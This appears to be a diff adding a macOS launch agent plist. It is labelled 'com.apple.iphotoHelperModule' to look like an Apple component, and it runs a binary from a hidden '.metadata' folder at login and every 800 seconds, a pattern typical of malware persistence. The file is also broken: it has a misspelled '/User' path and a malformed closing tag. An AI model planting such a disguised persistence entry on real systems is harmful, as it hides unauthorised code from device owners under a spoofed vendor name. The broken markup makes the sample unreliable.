@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+        <string>com.apple.iphotoHelperModule</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/User/bilbo/.metadata/iphotoHelper</string>
+    </array>
+        <key>RunAtLoad</key>
+        <true/>
+    <key>StartInterval</key>
+        <integer>800</integer>
+<dict>
+</plist>
